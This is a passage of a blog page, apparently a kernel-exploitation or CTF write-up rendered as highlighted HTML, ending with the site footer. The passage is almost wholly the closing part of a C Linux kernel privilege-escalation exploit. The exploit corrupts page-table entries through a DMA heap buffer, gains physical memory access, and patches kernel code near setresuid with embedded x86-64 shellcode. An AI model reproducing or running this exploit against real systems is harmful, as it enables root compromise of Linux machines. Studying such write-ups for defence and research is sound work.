+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        fds2[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/bin/busybox&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">long</span> x <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> overlap_idx <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">write</span>(fds[i], <span style="color:#ff7b72;font-weight:bold">&amp;</span>x, <span style="color:#a5d6ff">8</span>) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;write&#34;</span>);
+</span></span><span style="display:flex;"><span>            overlap_idx <span style="color:#ff7b72;font-weight:bold">=</span> i;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span>(overlap_idx <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[-] overlapping file not found, exploit fail</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] overlap idx: %d</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, overlap_idx);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] overlapping done</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">close</span>(fds2[i]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(i <span style="color:#ff7b72;font-weight:bold">!=</span> overlap_idx)
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">close</span>(fds[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] doing pte spray</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> j <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; j <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">8</span>; j<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">char</span><span style="color:#ff7b72;font-weight:bold">*</span>)(page_spray[i] <span style="color:#ff7b72;font-weight:bold">+</span> j<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x1000</span>) <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;A&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> j;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> dmafd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>, dma_buf_fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">struct</span> dma_heap_allocation_data data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data.len <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x1000</span>;
+</span></span><span style="display:flex;"><span>    data.fd_flags <span style="color:#ff7b72;font-weight:bold">=</span> O_RDWR;
+</span></span><span style="display:flex;"><span>    data.heap_flags <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>    data.fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    dmafd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/dev/dma_heap/system&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (dmafd <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">ioctl</span>(dmafd, DMA_HEAP_IOCTL_ALLOC, <span style="color:#ff7b72;font-weight:bold">&amp;</span>data) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] dma_buf_fd: %d</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, dma_buf_fd <span style="color:#ff7b72;font-weight:bold">=</span> data.fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x1000</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x2000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> j <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; j <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">8</span>; j<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">char</span><span style="color:#ff7b72;font-weight:bold">*</span>)(page_spray[i] <span style="color:#ff7b72;font-weight:bold">+</span> j<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x1000</span>) <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;A&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> j;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] doing pte spray done</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] corrupt pte entry</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">dup</span>(fds[overlap_idx]) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;dup&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] searching for overlapping page</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>evil <span style="color:#ff7b72;font-weight:bold">=</span> NULL;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x2000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">char</span><span style="color:#ff7b72;font-weight:bold">*</span>)(page_spray[i] <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">7</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x1000</span>) <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">&#39;A&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">7</span>) {
+</span></span><span style="display:flex;"><span>            evil <span style="color:#ff7b72;font-weight:bold">=</span> page_spray[i] <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x7000</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] found overlapping page: %p</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, evil);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (evil <span style="color:#ff7b72;font-weight:bold">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[-] overlapping page not found, exploit fail</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] remapping...</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">munmap</span>(evil, <span style="color:#a5d6ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>dma <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">mmap</span>(evil, <span style="color:#a5d6ff">0x1000</span>, PROT_READ <span style="color:#ff7b72;font-weight:bold">|</span> PROT_WRITE,
+</span></span><span style="display:flex;"><span>                    MAP_SHARED <span style="color:#ff7b72;font-weight:bold">|</span> MAP_POPULATE, dma_buf_fd, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">char</span><span style="color:#ff7b72;font-weight:bold">*</span>)dma <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;0&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] corrupt pte entry again</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">dup</span>(fds[overlap_idx]) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;dup&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] dma buffer contains: 0x%lx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)dma);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>arb_buf <span style="color:#ff7b72;font-weight:bold">=</span> NULL;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)dma <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x800000000009c067</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] dma buffer contains: 0x%lx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)dma);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x2000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (page_spray[i] <span style="color:#ff7b72;font-weight:bold">==</span> evil) <span style="color:#ff7b72">continue</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)page_spray[i] <span style="color:#ff7b72;font-weight:bold">&gt;</span> <span style="color:#a5d6ff">0xffff</span>) {
+</span></span><span style="display:flex;"><span>            arb_buf <span style="color:#ff7b72;font-weight:bold">=</span> page_spray[i];
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] found victim page table: %p</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, arb_buf);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">size_t</span> phys_base <span style="color:#ff7b72;font-weight:bold">=</span> ((<span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)arb_buf) <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#ff7b72;font-weight:bold">~</span><span style="color:#a5d6ff">0xfff</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x3a04000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] physical kbase: 0x%lx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, phys_base);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)dma <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x8000000000000000</span> <span style="color:#ff7b72;font-weight:bold">+</span> phys_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x1af000</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x67</span>; <span style="color:#8b949e;font-style:italic">// setresuid
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[*] dma buffer contains: 0x%lx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)dma);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> shellcode[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\xF3\x0F\x1E\xFA\xE8\x00\x00\x00\x00\x41\x5F\x49\x81\xEF\x59\xF5\x1A\x00\x49\x8D\xBF\x00\x6B\xA7\x02\x49\x8D\x87\x70\x26\x1C\x00\xFF\xD0\xBF\x01\x00\x00\x00\x49\x8D\x87\xA0\x8F\x1B\x00\xFF\xD0\x48\x89\xC7\x49\x8D\xB7\xC0\x68\xA7\x02\x49\x8D\x87\xD0\x0A\x1C\x00\xFF\xD0\x49\x8D\xBF\x20\x53\xBB\x02\x49\x8D\x87\xF0\xC0\x45\x00\xFF\xD0\x48\x89\xC3\x48\xBF\x11\x11\x11\x11\x11\x11\x11\x11\x49\x8D\x87\xA0\x8F\x1B\x00\xFF\xD0\x48\x89\x98\x28\x08\x00\x00\x31\xC0\x48\x89\x04\x24\x48\x89\x44\x24\x08\x48\xB8\x22\x22\x22\x22\x22\x22\x22\x22\x48\x89\x44\x24\x10\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x89\x44\x24\x18\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x48\x89\x44\x24\x20\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x48\x89\x44\x24\x28\x48\xB8\x66\x66\x66\x66\x66\x66\x66\x66\x48\x89\x44\x24\x30\x49\x8D\x87\xC6\x11\x40\x01\xFF\xE0\xCC</span><span style="color:#a5d6ff">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>p;
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">memmem</span>(shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode), <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x11\x11\x11\x11\x11\x11\x11\x11</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">getpid</span>();
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">memmem</span>(shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode), <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x22\x22\x22\x22\x22\x22\x22\x22</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)p <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">size_t</span>)<span style="color:#ff7b72;font-weight:bold">&amp;</span>win;
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">memmem</span>(shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode), <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x33\x33\x33\x33\x33\x33\x33\x33</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)p <span style="color:#ff7b72;font-weight:bold">=</span> user_cs;
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">memmem</span>(shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode), <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x44\x44\x44\x44\x44\x44\x44\x44</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)p <span style="color:#ff7b72;font-weight:bold">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">memmem</span>(shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode), <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x55\x55\x55\x55\x55\x55\x55\x55</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)p <span style="color:#ff7b72;font-weight:bold">=</span> user_rsp;
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">memmem</span>(shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode), <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x66\x66\x66\x66\x66\x66\x66\x66</span><span style="color:#a5d6ff">&#34;</span>, <span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">*</span>(<span style="color:#ff7b72">size_t</span><span style="color:#ff7b72;font-weight:bold">*</span>)p <span style="color:#ff7b72;font-weight:bold">=</span> user_ss;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">memcpy</span>(arb_buf<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x550</span>, shellcode, <span style="color:#ff7b72">sizeof</span>(shellcode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setresuid</span>(<span style="color:#a5d6ff">1000</span>, <span style="color:#a5d6ff">1000</span>, <span style="color:#a5d6ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
